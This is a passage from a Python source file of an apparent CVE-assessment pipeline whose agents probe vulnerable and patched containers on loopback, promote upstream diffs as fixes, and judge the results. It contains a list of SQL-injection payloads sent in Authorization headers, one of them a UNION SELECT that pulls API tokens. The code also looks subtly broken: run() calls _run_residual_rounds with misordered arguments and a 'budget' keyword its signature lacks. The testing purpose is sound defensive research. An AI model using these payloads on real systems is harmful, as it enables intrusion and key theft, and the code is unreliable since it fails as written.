            url=f"http://127.0.0.1:{port}",
            ready=ready,
            servable=servable,
            detail=detail,
        )

    @staticmethod
    def _write_provision(
        json_path: Path,
        log_path: Path,
        log_lines: list[str],
        *,
        status: str,
        note: str,
        targets: list[TargetHealth],
    ) -> None:
        log_path.write_text("\n".join(log_lines) + "\n", encoding="utf-8")
        json_path.write_text(
            json.dumps(
                {
                    "status": status,
                    "note": note,
                    "targets": [dataclasses.asdict(target) for target in targets],
                },
                indent=2,
            ),
            encoding="utf-8",
        )


class AdversarialLoopAgent:
    """Bounded exploit/defend/residual loop against the running harness.

    Replay the observed exploit/defense outcomes as structured rounds, then run
    a bounded set of residual/variant primitives against the PATCHED target.
    The loop terminates when the exploiter cannot re-escalate within the bound,
    or when a residual bypass is found. Every round is logged as an ndjson line
    and summarized in `negotiation/verdict.json`. The verdict — not the mere
    existence of a PoC file — drives the Judge.
    """

    residual_primitives: tuple[str, ...] = (
        "Bearer ' OR 1=1-- ",
        "Bearer x' UNION SELECT token,key_alias,user_id FROM api_keys--",
        "Bearer x' OR ''='",
        "Bearer sk-harness-demo-only' /* */",
        "Bearer a'; --",
    )

    def __init__(self, safety_policy: SafetyPolicy | None = None) -> None:
        self.safety_policy = safety_policy or SafetyPolicy()

    def run(
        self,
        cve: CveRecord,
        finding: ResearchFinding,
        harness: HarnessArtifact | None,
        exploiter: ExploiterArtifact | None,
        provision: ProvisionArtifact | None,
        artifact_root: Path,
        base_port: int = 4000,
        residual_rounds_budget: int = 0,
    ) -> NegotiationLog:
        neg_dir = artifact_root / "negotiation"
        neg_dir.mkdir(parents=True, exist_ok=True)
        exploit_log = neg_dir / "exploit-rounds.ndjson"
        defense_log = neg_dir / "defense-rounds.ndjson"
        residual_log = neg_dir / "residual-rounds.ndjson"
        transcript_log = neg_dir / "negotiation.log"
        verdict_path = neg_dir / "verdict.json"
        transcript: list[str] = [f"[negotiation] {cve.cve_id} class={finding.vulnerability_class}"]

        rounds: list[NegotiationRound] = []
        escalation_achieved = False
        patch_effective = False

        # Replay observed outcomes (captured by HarnessRunnerAgent) as logged
        # rounds. Both upstream (vulnerable/patched) and shim
        # (shim_vulnerable/shim_patched) variants are adversarial evidence;
        # both drive escalation_achieved / patch_effective.
        for outcome in (exploiter.outcomes if exploiter else []):
            is_vuln_variant = outcome.variant in {"vulnerable", "shim_vulnerable"}
            is_patched_variant = outcome.variant in {"patched", "shim_patched"}
            surface = "shim /verify" if outcome.variant.startswith("shim") else "upstream /health or /verify"
            if is_vuln_variant and outcome.triggered:
                rounds.append(
                    NegotiationRound(
                        role="exploiter", phase="exploit", round=1,
                        attempt=f"reproduce escalation against {surface}",
                        request="PoC primitive against vulnerable target",
                        response="observed vulnerable escalation",
                        observation=outcome.detail,
                        escalated=True, blocked=False,
                        rationale="Vulnerable target exhibited the CVE-described behavior as observed by the runner.",
                    )
                )
                escalation_achieved = True
            elif is_patched_variant and not outcome.triggered:
                rounds.append(
                    NegotiationRound(
                        role="defender", phase="defense", round=1,
                        attempt=f"repeat primitive against patched {surface}",
                        request="same PoC primitive against patched target",
                        response="patched target blocked the primitive",
                        observation=outcome.detail,
                        escalated=False, blocked=True,
                        rationale="Patched target blocked the original primitive.",
                    )
                )
                patch_effective = True

        residual_bypass = False
        residual_rounds = 0
        can_residual = bool(
            residual_rounds_budget > 0
            and provision is not None
            and provision.status in {"servable", "partially_servable"}
            and escalation_achieved
            and _docker_available()
        )
        if can_residual:
            residual_bypass = self._run_residual_rounds(
                cve, finding, base_port, artifact_root,
                residual_log, transcript, rounds,
                budget=residual_rounds_budget,
            )
            residual_rounds = sum(1 for r in rounds if r.phase == "residual")
        elif residual_rounds_budget > 0 and escalation_achieved:
            transcript.append(
                "[negotiation] residual phase skipped: Docker unavailable, patched target not servable, or no escalation"
            )

        if escalation_achieved and patch_effective and not residual_bypass:
            verdict = "defensive_signal_observed"
            rationale = (
                "Exploit loop reproduced the CVE-described escalation against the vulnerable "
                "target, the defense loop confirmed the patched target blocks the same behavior, "
                f"and {residual_rounds} residual primitive(s) did not re-escalate."
            )
        elif residual_bypass:
            verdict = "residual_bypass_found"
            rationale = (
                "A residual primitive re-escalated the patched target; the fix does not fully "
                "close the class boundary within the bounded residual phase."
            )
        elif escalation_achieved and not patch_effective:
            verdict = "exploit_reproduced"
            rationale = "The vulnerable target escalated but the patched target did not demonstrably block it."
        elif not escalation_achieved and (exploiter and exploiter.outcomes):
            verdict = "target_not_servable"
            rationale = "The observability rounds produced no escalation; the vulnerable surface was not demonstrably exploitable in this harness."
        elif provision is not None and provision.status == "not_servable":
            verdict = "target_not_servable"
            rationale = ("The harness target surface never became servable during provisioning, "
                         "so the adversarial loop had nothing to escalate against.")
        else:
            verdict = "not_executed"
            rationale = "The adversarial loop did not execute (no --execute-poc or nothing to observe)."

        exploit_rounds = sum(1 for r in rounds if r.phase == "exploit")
        defense_rounds = sum(1 for r in rounds if r.phase == "defense")
        log = NegotiationLog(
            executed=bool(rounds) or can_residual,
            escalation_achieved=escalation_achieved,
            patch_effective=patch_effective,
            residual_bypass=residual_bypass,
            rounds=rounds,
            rounds_total=len(rounds),
            exploit_rounds=exploit_rounds,
            defense_rounds=defense_rounds,
            residual_rounds=residual_rounds,
            verdict=verdict,
            rationale=rationale,
            log_path=_relpath(transcript_log, artifact_root),
            verdict_path=_relpath(verdict_path, artifact_root),
        )
        self._write_negotiation(
            exploit_log, defense_log, residual_log, transcript_log, verdict_path, rounds, log, transcript
        )
        return log

    def _run_residual_rounds(
        self,
        cve: CveRecord,
        harness: HarnessArtifact | None,
        finding: ResearchFinding,
        base_port: int,
        artifact_root: Path,
        residual_log: Path,
        transcript: list[str],
        rounds: list[NegotiationRound],
    ) -> bool:
        """Start a fresh patched shim and throw a bounded set of variant primitives.

        Returns True if any primitive escalated (residual bypass found).
        """
        shim_patched = artifact_root / "harness" / "shim" / "patched"
        if not shim_patched.is_dir():
            transcript.append("[negotiation] patched shim missing; residual phase aborted")
            return False
        net = f"cvehunt-res-{os.getpid()}-{base_port}"
        image = f"cvehunt-res-{cve.cve_id.lower()}-patched:latest"
        name = f"cvehunt-res-{os.getpid()}-patched"
        port = base_port + 11
        bypass = False
        try:
            self._docker(["network", "create", net], transcript)
            self._docker(["build", "-t", image, "-f", str(shim_patched / "Dockerfile"), str(shim_patched)], transcript)
            self._docker(
                ["run", "-d", "--name", name, "--network", net, f"-p", f"127.0.0.1:{port}:8000", image],
                transcript,
            )
            if not self._wait_ready(port, deadline=60):
                transcript.append(f"[negotiation] patched shim never became ready on {port}")
                return False
            for idx, primitive in enumerate(self.residual_primitives, start=1):
                status, body = _http_probe(
                    f"http://127.0.0.1:{port}/verify",
                    headers={"Authorization": primitive},
                    timeout=5.0,
                )
                escalated = status == 200 and ("key_alias" in body or "user_id" in body or "keys" in body)
                blocked = not escalated
                round_entry = NegotiationRound(
                    role="exploiter",
                    phase="residual",
                    round=idx,
                    attempt=primitive,
                    request=f"GET /verify Authorization: {primitive}",
                    response=f"HTTP {status}",
                    observation=body[:256],
                    escalated=escalated,
                    blocked=blocked,
                    rationale=("residual primitive escalated against patched target" if escalated
                               else "patched target blocked residual primitive"),
                )
                rounds.append(round_entry)
                transcript.append(
                    f"[negotiation] residual round {idx}: primitive={primitive!r} "
                    f"status={status} escalated={escalated}"
                )
                if escalated:
                    bypass = True
        finally:
            self._docker(["rm", "-f", name], transcript, check=False)
            if net:
                self._docker(["network", "rm", net], transcript, check=False)
        return bypass

    @staticmethod
    def _docker(cmd: list[str], transcript: list[str], check: bool = True) -> None:
        transcript.append(f"[negotiation] $ docker {' '.join(cmd)}")
        try:
            subprocess.run(
                ["docker", *cmd],
                timeout=120,
                check=check,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )
        except FileNotFoundError:
            transcript.append("[negotiation] docker binary not found")

    @staticmethod
    def _wait_ready(port: int, deadline: int = 60) -> bool:
        import time
        for _ in range(deadline):
            status, _ = _http_probe(f"http://127.0.0.1:{port}/health/readiness", timeout=2.0)
            if status == 200:
                return True
            time.sleep(1)
        return False

    @staticmethod
    def _write_negotiation(
        exploit_log: Path,
        defense_log: Path,
        residual_log: Path,
        transcript_log: Path,
        verdict_path: Path,
        rounds: list[NegotiationRound],
        log: NegotiationLog,
        transcript: list[str],
    ) -> None:
        for path, phase in (
            (exploit_log, "exploit"),
            (defense_log, "defense"),
            (residual_log, "residual"),
        ):
            with path.open("w", encoding="utf-8") as handle:
                for entry in rounds:
                    if entry.phase == phase:
                        handle.write(json.dumps(dataclasses.asdict(entry)) + "\n")
        transcript_log.write_text("\n".join(transcript) + "\n", encoding="utf-8")
        verdict_path.write_text(
            json.dumps(
                {
                    "executed": log.executed,
                    "escalation_achieved": log.escalation_achieved,
                    "patch_effective": log.patch_effective,
                    "residual_bypass": log.residual_bypass,
                    "rounds_total": log.rounds_total,
                    "exploit_rounds": log.exploit_rounds,
                    "defense_rounds": log.defense_rounds,
                    "residual_rounds": log.residual_rounds,
                    "verdict": log.verdict,
                    "rationale": log.rationale,
                },
                indent=2,
            ),
            encoding="utf-8",
        )


class FixDeveloperAgent:
    def develop(
        self,
        cve: CveRecord,
        sources: SourceBundle | None,
        finding: ResearchFinding,
        artifact_root: Path,
    ) -> FixArtifact:
        if not sources or sources.status != "materialized" or not sources.diff_path:
            return FixArtifact(
                status="not_applicable",
                message="No materialized upstream diff is available to derive a candidate fix from.",
            )
        fix_dir = artifact_root / "fix"
        fix_dir.mkdir(parents=True, exist_ok=True)
        diff_source = (artifact_root / sources.diff_path).read_text(encoding="utf-8")
        if not diff_source.strip():
            return FixArtifact(
                status="not_applicable",
                message="Upstream diff was empty; no candidate fix could be promoted.",
            )
        candidate = fix_dir / "candidate.patch"
        candidate.write_text(diff_source, encoding="utf-8")
        rationale_path = fix_dir / "rationale.md"
        rationale_text = _fix_rationale(cve, finding, sources)
        rationale_path.write_text(rationale_text, encoding="utf-8")
        notes = [
            "Promoted the upstream vulnerable→patched diff as the candidate fix.",
            f"Strongest observed patch signal: {finding.relevant_patch_signal}",
        ]
        validated, validation_notes = _validate_candidate_patch(candidate, sources, artifact_root, fix_dir)
        notes.extend(validation_notes)
        status: FixStatus = "validated" if validated else "generated"
        message = (
            "Candidate patch promoted from the upstream diff and validated by applying it to the vulnerable source tree."
            if validated
            else "Candidate patch promoted from the upstream vulnerable→patched diff."
        )
        return FixArtifact(
            status=status,
            message=message,
            candidate_patch=_relpath(candidate, artifact_root),
            rationale=_relpath(rationale_path, artifact_root),
            notes=notes,
        )


class ValidatorAgent:
    def validate(
        self,
        cve: CveRecord,
        plan: ValidationPlan,
        sources: SourceBundle | None,
        harness: HarnessArtifact | None,
        exploiter: ExploiterArtifact | None = None,
        fix: FixArtifact | None = None,
        provision: ProvisionArtifact | None = None,
        negotiation: NegotiationLog | None = None,
    ) -> list[Evidence]:
        evidence: list[Evidence] = []
        vulnerable_escalated = self._behavioral_escalation(exploiter)
        patched_blocked = self._behavioral_block(exploiter)
        residual_bypass = bool(negotiation and negotiation.residual_bypass)
        for check in plan.checks:
            if check.name == "published package pair retrieved":
                passed = bool(
                    sources
                    and sources.status == "materialized"
                    and sources.vulnerable_root
                    and sources.patched_root
                )
                evidence.append(
                    Evidence(
                        check_name=check.name,
                        vulnerable_signal=check.expected_vulnerable_signal,
                        patched_signal=check.expected_patched_signal,
                        passed=passed,
                        artifact=check.artifact,
                    )
                )
                continue
            if check.name == "patch diff captured":
                passed = bool(
                    sources
                    and sources.status == "materialized"
                    and sources.diff_path
                    and sources.changed_files
                )
                evidence.append(
                    Evidence(
                        check_name=check.name,
                        vulnerable_signal=check.expected_vulnerable_signal,
                        patched_signal=check.expected_patched_signal,
                        passed=passed,
                        artifact=check.artifact,
                    )
                )
                continue
            if check.name == "container harness scaffolded":
                passed = bool(
                    harness
                    and harness.status == "built"
                    and len(harness.dockerfiles) == 2
                )
                evidence.append(
                    Evidence(
                        check_name=check.name,
                        vulnerable_signal=check.expected_vulnerable_signal,
                        patched_signal=check.expected_patched_signal,
                        passed=passed,
                        artifact=check.artifact,
                    )
                )
                continue
            if check.name == "patched-vs-vulnerable differential check":
                # The differential check is behavioral, not lexical. Passing on
                # "the two cve.safe_fixture strings differ" would credit the
                # input as evidence — that was the prior mislabeling. It now
                # passes only when the harness actually demonstrated a
                # vulnerable escalation that the patched target blocked, and
                # no residual bypass was later observed.
                diff_passed = bool(vulnerable_escalated and patched_blocked and not residual_bypass)
                vuln_signal = (
                    "observed vulnerable escalation" if vulnerable_escalated
                    else (cve.safe_fixture.get("vulnerable_signal") or "no vulnerable escalation observed")
                )
                patched_sig = (
                    "observed patched block" if patched_blocked
                    else (cve.safe_fixture.get("patched_signal") or "no patched block observed")
                )
                residual_note = "; residual bypass observed" if residual_bypass else ""
                evidence.append(
                    Evidence(
                        check_name=check.name,
                        vulnerable_signal=vuln_signal + residual_note,
                        patched_signal=patched_sig + residual_note,
                        passed=diff_passed,
                        artifact=("negotiation/verdict.json" if negotiation and negotiation.executed else check.artifact),
                    )
                )
                continue
            evidence.append(
                Evidence(
                    check_name=check.name,
                    vulnerable_signal=check.expected_vulnerable_signal,
                    patched_signal=check.expected_patched_signal,
                    passed=check.expected_vulnerable_signal != check.expected_patched_signal,
                    artifact=check.artifact,
                )
            )
        if exploiter is not None:
            evidence.append(
                Evidence(
                    check_name="harness-bound poc scaffolded",
                    vulnerable_signal=(
                        exploiter.poc_path or "no poc artifact emitted"
                    ),
                    patched_signal=(
                        exploiter.runner_path or "no runner artifact emitted"
                    ),
                    passed=exploiter.implemented,
                    artifact=exploiter.artifact,
                )
            )
            if exploiter.outcomes:
                vulnerable_outcome = next(
                    (item for item in exploiter.outcomes if item.variant == "vulnerable"),
                    None,
                )
                patched_outcome = next(
                    (item for item in exploiter.outcomes if item.variant == "patched"),
                    None,
                )
                if vulnerable_outcome is not None:
                    evidence.append(
                        Evidence(
                            check_name="harness poc triggered vulnerable container",
                            vulnerable_signal=vulnerable_outcome.detail,
                            patched_signal=(
                                patched_outcome.detail
                                if patched_outcome is not None
                                else "no patched outcome captured"
                            ),
                            passed=vulnerable_outcome.triggered,
                            artifact="exploiter/outcome.json",
                        )
                    )
                if patched_outcome is not None:
                    evidence.append(
                        Evidence(
                            check_name="harness poc blocked by patched container",
                            vulnerable_signal=(
                                vulnerable_outcome.detail
                                if vulnerable_outcome is not None
                                else "no vulnerable outcome captured"
                            ),
                            patched_signal=patched_outcome.detail,
                            passed=not patched_outcome.triggered,
                            artifact="exploiter/outcome.json",
                        )
                    )
                shim_vulnerable_outcome = next(
                    (item for item in exploiter.outcomes if item.variant == "shim_vulnerable"),
                    None,
                )
                shim_patched_outcome = next(
                    (item for item in exploiter.outcomes if item.variant == "shim_patched"),
                    None,
                )
                if shim_vulnerable_outcome is not None:
                    evidence.append(
                        Evidence(
                            check_name="harness shim triggered vulnerable demo surface",
                            vulnerable_signal=shim_vulnerable_outcome.detail,
                            patched_signal=(
                                shim_patched_outcome.detail
                                if shim_patched_outcome is not None
                                else "no shim patched outcome captured"
                            ),
                            passed=shim_vulnerable_outcome.triggered,
                            artifact="exploiter/outcome.json",
                        )
                    )
                if shim_patched_outcome is not None:
                    evidence.append(
                        Evidence(
                            check_name="harness shim blocked by patched demo surface",
                            vulnerable_signal=(
                                shim_vulnerable_outcome.detail
                                if shim_vulnerable_outcome is not None
                                else "no shim vulnerable outcome captured"
                            ),
                            patched_signal=shim_patched_outcome.detail,
                            passed=not shim_patched_outcome.triggered,
                            artifact="exploiter/outcome.json",
                        )
                    )
        if fix is not None:
            evidence.append(
                Evidence(
                    check_name="candidate fix promoted",
                    vulnerable_signal=fix.candidate_patch or "no candidate patch",
                    patched_signal=fix.rationale or "no rationale recorded",
                    passed=fix.status in {"generated", "validated"},
                    artifact=fix.candidate_patch,
                )
            )
            evidence.append(
                Evidence(
                    check_name="candidate fix applied to vulnerable source tree",
                    vulnerable_signal=fix.candidate_patch or "no candidate patch",
                    patched_signal="fix/validation.json",
                    passed=fix.status == "validated",
                    artifact="fix/validation.json",
                )
            )
        if provision is not None:
            evidence.append(
                Evidence(
                    check_name="harness provisioned and health-checked",
                    vulnerable_signal=provision.status,
                    patched_signal=provision.note,
                    passed=provision.status in {"servable", "partially_servable"},
                    artifact=provision.json_path,
                )
            )
        if negotiation is not None and negotiation.executed:
            evidence.append(
                Evidence(
                    check_name="adversarial loop reached a verdict",
                    vulnerable_signal=("escalation observed" if negotiation.escalation_achieved else "no escalation observed"),
                    patched_signal=negotiation.verdict,
                    passed=negotiation.escalation_achieved
                    and negotiation.patch_effective
                    and not negotiation.residual_bypass,
                    artifact=negotiation.verdict_path,
                )
            )
        return evidence

    @staticmethod
    def _behavioral_escalation(exploiter: ExploiterArtifact | None) -> bool:
        if not exploiter:
            return False
        return any(item.triggered for item in exploiter.outcomes if item.variant in {"vulnerable", "shim_vulnerable"})

    @staticmethod
    def _behavioral_block(exploiter: ExploiterArtifact | None) -> bool:
        if not exploiter:
            return False
        return any(
            not item.triggered for item in exploiter.outcomes if item.variant in {"patched", "shim_patched"}
        )


class JudgeAgent:
    def judge(
        self,
        cve: CveRecord,
        finding: ResearchFinding,
        sources: SourceBundle | None,
        harness: HarnessArtifact | None,
        exploiter: ExploiterArtifact | None,
        fix: FixArtifact | None,
        evidence: list[Evidence],
        provision: ProvisionArtifact | None = None,
        negotiation: NegotiationLog | None = None,
    ) -> Judgement:
        if cve.name == "Unknown":
            return Judgement(
                status="not_supported",
                confidence=0.0,
                rationale="No local fixture exists, so the workflow cannot assess this CVE.",
                remediation_notes=["Add a safe fixture before running automated assessment."],
                safety_notes=["No exploit code or external target interaction was attempted."],
            )

        # Behavioral (outcome-derived) evidence describes what happened when
        # the adversarial loop ran. It can legitimately fail — e.g., the target
        # surface never served, or the exploit never escalated — without the
        # workflow itself being malformed. Only structural evidence (artifacts
        # materially existing) must pass for the run to be well-formed. A
        # well-formed run with NO behavioral outcomes is NOT a defensive
        # signal; it is `needs_human_review` at a capped low confidence.
        behavioral_check_names = {
            "harness poc triggered vulnerable container",
            "harness poc blocked by patched container",
            "harness shim triggered vulnerable demo surface",
            "harness shim blocked by patched demo surface",
            "patched-vs-vulnerable differential check",
            "harness provisioned and health-checked",
            "adversarial loop reached a verdict",
        }
        structural_evidence = [
            item for item in evidence if item.check_name not in behavioral_check_names
        ]
        passed = all(item.passed for item in structural_evidence)
        if not passed:
            return Judgement(
                status="insufficient_evidence",
                confidence=0.35,
                rationale="The workflow did not fully materialize enough offline evidence to assess this CVE.",
                remediation_notes=[
                    "Review the captured source acquisition and harness notes manually.",
                    "Confirm affected versions and package availability before retrying.",
                ],
                safety_notes=[
                    "Assessment stayed within offline package acquisition and local fixtures.",
                    "No proof-of-concept logic was generated.",
                ],
            )

        outcomes = list(exploiter.outcomes) if exploiter else []
        upstream_triggered = any(item.variant == "vulnerable" and item.triggered for item in outcomes)
        upstream_blocked = any(item.variant == "patched" and not item.triggered for item in outcomes)
        shim_triggered = any(item.variant == "shim_vulnerable" and item.triggered for item in outcomes)
        shim_blocked = any(item.variant == "shim_patched" and not item.triggered for item in outcomes)
        escalation_achieved = bool(upstream_triggered or shim_triggered)
        patch_effective = bool(upstream_blocked or shim_blocked)
        residual_bypass = bool(negotiation and negotiation.residual_bypass)
        has_behavioral = bool(outcomes) or bool(negotiation and negotiation.executed)

        base_rationale = (
            f"Downloaded vulnerable and patched {cve.ecosystem} releases, captured a real source diff, "
            f"and generated an isolated harness scaffold. The strongest observed patch signal was: "
            f"{finding.relevant_patch_signal}"
        )
        remediation_notes = [
            f"Pin deployments to {', '.join(cve.patched_versions) or 'the patched release'} as a minimum floor.",
            "Review the generated source diff and carry the same guard conditions into downstream forks.",
            "Add regression tests that assert the patched behavior captured by the fixture remains blocked.",
        ]
        safety_notes = [
            "PoC artifacts target 127.0.0.1 only and are bound to the harness compose stack.",
            "Service ports are bound to the loopback interface; no external target is reachable.",
            "Source acquisition only contacts package registry download endpoints.",
        ]

        if residual_bypass:
            return self._judgement(
                "residual_bypass_found", 0.45,
                base_rationale
                + " The adversarial loop found a residual primitive that re-escalated the patched target, "
                  "so the candidate fix does not fully close the vulnerability class within the bounded "
                  "residual phase — this is NOT a defensive signal.",
                remediation_notes, safety_notes,
            )
        if escalation_achieved and patch_effective:
            if upstream_triggered and upstream_blocked:
                confidence = 0.95
                layer = "upstream"
            else:
                confidence = 0.90
                layer = "shim (class-level demonstration; upstream package exploit not confirmed)"
            rationale = base_rationale
            rationale += (
                f" The adversarial loop reproduced the CVE-described escalation against the vulnerable "
                f"target ({layer}) and confirmed the patched target blocks the same behavior."
            )
            if negotiation and negotiation.residual_rounds:
                rationale += (
                    f" {negotiation.residual_rounds} bounded residual primitive(s) did not re-escalate."
                )
            return self._judgement(
                "defensive_signal_observed", confidence, rationale, remediation_notes, safety_notes
            )
        if escalation_achieved and not patch_effective:
            return self._judgement(
                "exploit_reproduced", 0.65,
                base_rationale
                + " The adversarial loop reproduced the escalation against the vulnerable target, but "
                  "the patched target did not demonstrably block the same behavior — remediation is "
                  "not proven; this is NOT a defensive signal.",
                remediation_notes, safety_notes,
            )
        # The provision gate ran and the target surface was never servable. A
        # failed gate is itself a behavioral observation (we tried to provision
        # and could not), so it routes here regardless of whether any exploit
        # outcome was also captured.
        if provision is not None and provision.status == "not_servable":
            confidence = 0.50
            rationale = base_rationale
            rationale += (
                " The harness target surface never became servable during provisioning, so no "
                "escalation could be demonstrated; this is NOT a defensive signal."
            )
            return self._judgement(
                "target_not_servable", confidence, rationale, remediation_notes, safety_notes
            )
        # Sources/harness were materialized, the loop ran, but no escalation.
        if has_behavioral:
            confidence = 0.50
            rationale = base_rationale
            rationale += (
                " The exploit loop ran against the provisioned target but did not reproduce the "
                "CVE-described escalation; this is NOT a defensive signal."
            )
            return self._judgement(
                "needs_human_review", confidence, rationale, remediation_notes, safety_notes
            )
        # No --execute-poc (or nothing executed): scaffolding exists with no behavior.
        rationale = base_rationale
        rationale += (
            " No behavioral observation was captured (the adversarial loop did not execute against "
            "the running target). Artifacts alone are not evidence; this is NOT a defensive signal."
        )
        return self._judgement(
            "needs_human_review", 0.45, rationale, remediation_notes, safety_notes
        )

    @staticmethod
    def _judgement(status, confidence, rationale, remediation_notes, safety_notes) -> Judgement:
        return Judgement(
            status=status,
            confidence=confidence,
            rationale=rationale,
            remediation_notes=remediation_notes,
            safety_notes=safety_notes,
        )


def _validate_candidate_patch(
    candidate: Path,
    sources: SourceBundle,
    artifact_root: Path,
    fix_dir: Path,
) -> tuple[bool, list[str]]:
    notes: list[str] = []
    validation_json = fix_dir / "validation.json"
    validation_md = fix_dir / "validation.md"
    vulnerable_root = artifact_root / sources.vulnerable_root if sources.vulnerable_root else None
    patched_root = artifact_root / sources.patched_root if sources.patched_root else None
    if vulnerable_root is None or patched_root is None or not vulnerable_root.exists() or not patched_root.exists():
        reason = "Candidate fix validation skipped: vulnerable or patched source root is missing."
        validation_json.write_text(
            json.dumps({"validated": False, "reason": reason}, indent=2),
            encoding="utf-8",
        )
        validation_md.write_text(f"# Candidate Fix Validation\n\n- Validated: no\n- Reason: {reason}\n", encoding="utf-8")
        return False, [reason]

    applied_root = fix_dir / "applied"
    if applied_root.exists():
        _remove_tree(applied_root)
    shutil.copytree(vulnerable_root, applied_root)
    apply_log = fix_dir / "apply.log"
    apply_method = "CVEHunt in-process unified-diff applier"
    try:
        applied_paths = _apply_unified_diff(candidate, applied_root)
        apply_log.write_text(
            "Applied candidate.patch with CVEHunt's in-process unified-diff applier.\n"
            + "\n".join(applied_paths)
            + "\n",
            encoding="utf-8",
        )
    except ValueError as exc:
        if applied_root.exists():
            _remove_tree(applied_root)
        shutil.copytree(vulnerable_root, applied_root)
        fallback_ok, fallback_log = _apply_with_patch_command(candidate, applied_root)
        apply_log.write_text(
            f"In-process applier failed: {exc}\n\nFallback patch command output:\n{fallback_log}\n",
            encoding="utf-8",
        )
        if not fallback_ok:
            reason = f"Candidate fix validation failed: {exc}"
            validation_json.write_text(
                json.dumps(
                    {
                        "validated": False,
                        "reason": reason,
                        "apply_log": "fix/apply.log",
                    },
                    indent=2,
                ),
                encoding="utf-8",
            )
            validation_md.write_text(f"# Candidate Fix Validation\n\n- Validated: no\n- Reason: {reason}\n- Apply log: fix/apply.log\n", encoding="utf-8")
            return False, [reason, "Validation artifact: fix/validation.json"]
        apply_method = "GNU patch fallback after in-process applier reported a mismatch"

    diff_paths = _paths_from_unified_diff(candidate)
    mismatches: list[str] = []
    for relative in diff_paths:
        applied_path = applied_root / relative
        patched_path = patched_root / relative
        if applied_path.exists() != patched_path.exists():
            if applied_path.exists() and not patched_path.exists() and applied_path.read_bytes() == b"":
                # difflib represents deleted files as an empty patched side
                # rather than /dev/null; an empty applied file is equivalent
                # to absence for this generated candidate diff.
                continue
            mismatches.append(relative)
            continue
        if applied_path.exists() and patched_path.exists():
            if not _files_equivalent(applied_path, patched_path):
                mismatches.append(relative)
    validated = not mismatches
    result = {
        "validated": validated,
        "method": f"apply candidate.patch with {apply_method} to copied vulnerable source tree and compare patched files by normalized text content or SHA-256 for binary files",
        "applied_root": "fix/applied",
        "candidate_patch": "fix/candidate.patch",
        "apply_log": "fix/apply.log",
        "compared_files": diff_paths,
        "mismatches": mismatches,
    }
    validation_json.write_text(json.dumps(result, indent=2), encoding="utf-8")
    validation_md.write_text(
        "# Candidate Fix Validation\n\n"
        f"- Validated: {'yes' if validated else 'no'}\n"
        f"- Method: applied `fix/candidate.patch` with {apply_method} to a copied vulnerable source tree and compared changed files to the upstream patched source tree by normalized text content or SHA-256 for binary files.\n"
        f"- Compared files: {len(diff_paths)}\n"
        f"- Mismatches: {len(mismatches)}\n"
        "- Machine-readable result: fix/validation.json\n",
        encoding="utf-8",
    )
    if validated:
        notes.append(
            "Validated candidate fix by applying it to a copied vulnerable source tree and matching changed files against the upstream patched tree."
        )
    else:
        notes.append(
            "Candidate fix validation failed: applied tree did not match upstream patched files."
        )
    notes.append("Validation artifact: fix/validation.json")
    return validated, notes


def _apply_with_patch_command(candidate: Path, root: Path) -> tuple[bool, str]:
    patch_bin = shutil.which("patch")
    if patch_bin is None:
        return False, "GNU patch command is not available."
    try:
        process = subprocess.Popen(
            [patch_bin, "-p1", "--batch", "--forward", "-i", str(candidate.resolve())],
            cwd=str(root),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        stdout, stderr = process.communicate(timeout=120)
    except (OSError, subprocess.TimeoutExpired) as exc:
        return False, str(exc)
    return process.returncode == 0, f"exit_code={process.returncode}\nstdout:\n{stdout}\nstderr:\n{stderr}"


def _paths_from_unified_diff(diff_path: Path) -> list[str]:
    paths: set[str] = set()
    for line in diff_path.read_text(encoding="utf-8", errors="replace").splitlines():
        if line.startswith("+++ b/"):
            paths.add(line[len("+++ b/") :])
        elif line.startswith("--- a/"):
            paths.add(line[len("--- a/") :])
    paths.discard("/dev/null")
    return sorted(paths)


def _apply_unified_diff(diff_path: Path, root: Path) -> list[str]:
    lines = diff_path.read_text(encoding="utf-8", errors="replace").splitlines(keepends=True)
    applied: list[str] = []
    index = 0
    while index < len(lines):
        line = lines[index]
        if not line.startswith("--- "):
            index += 1
            continue
        old_header = line.strip()
        index += 1
        if index >= len(lines) or not lines[index].startswith("+++ "):
            raise ValueError(f"malformed diff after {old_header}")
        new_header = lines[index].strip()
        index += 1
        old_path = _diff_header_path(old_header, "--- ")
        new_path = _diff_header_path(new_header, "+++ ")
        relative = new_path if new_path != "/dev/null" else old_path
        if relative == "/dev/null":
            continue
        target = root / relative
        original = _read_lines(target)
        result: list[str] = []
        source_index = 0
        while index < len(lines):
            hunk_header = lines[index]
            if hunk_header.startswith("--- "):
                break
            if not hunk_header.startswith("@@ "):
                index += 1
                continue
            old_start = _parse_hunk_old_start(hunk_header)
            copy_until = max(old_start - 1, 0)
            if copy_until < source_index:
                raise ValueError(f"overlapping hunk while applying {relative}")
            result.extend(original[source_index:copy_until])
            source_index = copy_until
            index += 1
            while index < len(lines):
                hunk_line = lines[index]
                if hunk_line.startswith("@@ ") or hunk_line.startswith("--- "):
                    break
                if hunk_line.startswith(" "):
                    content = hunk_line[1:]
                    if source_index >= len(original):
                        raise ValueError(f"context extends past end of {relative}")
                    if original[source_index] != content:
                        raise ValueError(f"context mismatch while applying {relative}")
                    result.append(content)
                    source_index += 1
                elif hunk_line.startswith("-"):
                    content = hunk_line[1:]
                    if source_index >= len(original):
                        raise ValueError(f"deletion extends past end of {relative}")
                    if original[source_index] != content:
                        raise ValueError(f"deletion mismatch while applying {relative}")
                    source_index += 1
                elif hunk_line.startswith("+"):
                    result.append(hunk_line[1:])
                elif hunk_line.startswith("\\ No newline"):
                    pass
                elif hunk_line == "\n":
                    # ResearcherAgent separates file diffs with a blank line; an
                    # actual blank context line would be encoded as " \\n".
                    index += 1
                    break
                else:
                    raise ValueError(f"unexpected hunk line while applying {relative}: {hunk_line[:40]!r}")
                index += 1
        result.extend(original[source_index:])
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text("".join(result), encoding="utf-8")
        applied.append(relative)
    return applied


def _diff_header_path(header: str, prefix: str) -> str:
    value = header[len(prefix) :].split("\t", 1)[0]
    if value.startswith("a/") or value.startswith("b/"):
        return value[2:]
    return value


def _parse_hunk_old_start(header: str) -> int:
    # Example: @@ -12,7 +12,8 @@
    try:
        old_range = header.split(" ", 3)[1]
        return int(old_range[1:].split(",", 1)[0])
    except (IndexError, ValueError) as exc:
        raise ValueError(f"malformed hunk header: {header.strip()}") from exc


def _poc_investigation_payload(
    cve: CveRecord,
    finding: ResearchFinding,
    harness: HarnessArtifact,
    base_port: int,
